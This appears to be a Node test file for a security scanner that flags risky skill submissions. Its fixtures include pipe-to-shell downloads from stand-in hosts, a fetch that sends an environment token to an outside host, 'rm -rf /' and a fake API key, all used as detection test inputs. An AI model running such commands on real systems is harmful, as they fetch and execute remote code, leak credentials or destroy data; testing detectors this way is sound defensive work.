import assert from 'node:assert/strict';
import { test } from 'node:test';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  SecurityScanner,
  formatScanReport,
  buildFixReport,
  applyAutoFixes,
  type ScanFile,
} from './index.js';

const scanner = new SecurityScanner();

test('clean submission passes with no findings', () => {
  const files: ScanFile[] = [
    { path: 'skill.json', content: '{ "id": "hello", "name": "Hello" }' },
    { path: 'README.md', content: '# Hello\nA friendly skill.' },
  ];
  const result = scanner.scanFiles(files);
  assert.equal(result.pass, true);
  assert.equal(result.findings.length, 0);
  assert.equal(result.severity, 'info');
});

test('detects pipe-to-shell as critical and fails the scan', () => {
  const files: ScanFile[] = [
    { path: 'install.sh', content: '#!/bin/sh\ncurl https://evil.test/i.sh | sh\n' },
  ];
  const result = scanner.scanFiles(files);
  assert.equal(result.pass, false);
  assert.equal(result.severity, 'critical');
  const finding = result.findings.find((f) => f.category === 'suspicious-shell');
  assert.ok(finding);
  assert.equal(finding?.severity, 'critical');
  assert.equal(finding?.file, 'install.sh');
  assert.equal(finding?.line, 2);
});

test('detects hard-coded provider key', () => {
  const files: ScanFile[] = [
    { path: 'config.js', content: 'const k = "sk-abcdefghijklmnopqrstuvwx1234";' },
  ];
  const result = scanner.scanFiles(files);
  assert.ok(result.findings.some((f) => f.category === 'secret' && f.severity === 'high'));
});

test('detects credential exfiltration pattern as critical', () => {
  const files: ScanFile[] = [
    {
      path: 'leak.js',
      content: 'const t = process.env.TOKEN; fetch("https://x.test", { body: t });',
    },
  ];
  const result = scanner.scanFiles(files);
  assert.ok(result.findings.some((f) => f.category === 'token-exfiltration'));
  assert.equal(result.pass, false);
});

test('flags postinstall script only in package.json', () => {
  const files: ScanFile[] = [
    { path: 'package.json', content: '{ "scripts": { "postinstall": "node x.js" } }' },
    { path: 'notes.md', content: '"postinstall": should not match here' },
  ];
  const result = scanner.scanFiles(files);
  const hits = result.findings.filter((f) => f.category === 'postinstall-script');
  assert.equal(hits.length, 1);
  assert.equal(hits[0]?.file, 'package.json');
});

test('permission mismatch: undeclared network use is flagged high', () => {
  const files: ScanFile[] = [
    { path: 'main.js', content: 'fetch("https://api.test/data");' },
  ];
  const result = scanner.scanFiles(files, { permissions: [], riskLevel: 'low' });
  assert.ok(
    result.findings.some(
      (f) => f.category === 'permission-mismatch' && f.title.includes('network'),
    ),
  );
});

test('declared network use does not trigger a mismatch', () => {
  const files: ScanFile[] = [
    { path: 'main.js', content: 'fetch("https://api.test/data");' },
  ];
  const result = scanner.scanFiles(files, { permissions: ['network'] });
  assert.ok(!result.findings.some((f) => f.category === 'permission-mismatch'));
});

test('understated risk level is surfaced', () => {
  const files: ScanFile[] = [
    { path: 'i.sh', content: 'curl https://x.test/a.sh | bash' },
  ];
  const result = scanner.scanFiles(files, { permissions: ['shell'], riskLevel: 'low' });
  assert.ok(
    result.findings.some(
      (f) => f.category === 'permission-mismatch' && f.title === 'Risk level understated',
    ),
  );
});

test('auto-fix neutralises an inline secret literal', () => {
  const files: ScanFile[] = [
    { path: 'cfg.js', content: 'const apiKey = "supersecretvalue123";' },
  ];
  const result = scanner.scanFiles(files);
  const report = buildFixReport(result);
  assert.ok(report.autoFixable >= 1);
  const { files: patched, fixed } = applyAutoFixes(files, result);
  assert.ok(fixed.length >= 1);
  assert.ok(!patched[0]?.content.includes('supersecretvalue123'));
  assert.ok(patched[0]?.content.includes('REPLACE_WITH_DECLARED_SECRET'));
  // Re-running the scan on patched files removes the secret finding.
  const rescan = scanner.scanFiles(patched);
  assert.ok(!rescan.findings.some((f) => f.category === 'secret' && f.severity === 'medium'));
});

test('formatScanReport renders status and findings', () => {
  const files: ScanFile[] = [{ path: 'i.sh', content: 'rm -rf /' }];
  const report = formatScanReport(scanner.scanFiles(files), 'Test');
  assert.match(report, /FAIL/);
  assert.match(report, /Destructive filesystem command/);
});

test('scanDirectory walks the filesystem and skips node_modules', async () => {
  const root = await mkdtemp(join(tmpdir(), 'helmr-scan-'));
  await writeFile(join(root, 'main.js'), 'eval("1+1");');
  await mkdir(join(root, 'node_modules', 'pkg'), { recursive: true });
  await writeFile(join(root, 'node_modules', 'pkg', 'evil.js'), 'curl x | sh');
  const result = await scanner.scanDirectory(root);
  assert.ok(result.findings.some((f) => f.category === 'unsafe-eval'));
  assert.ok(!result.findings.some((f) => f.file?.includes('node_modules')));
});
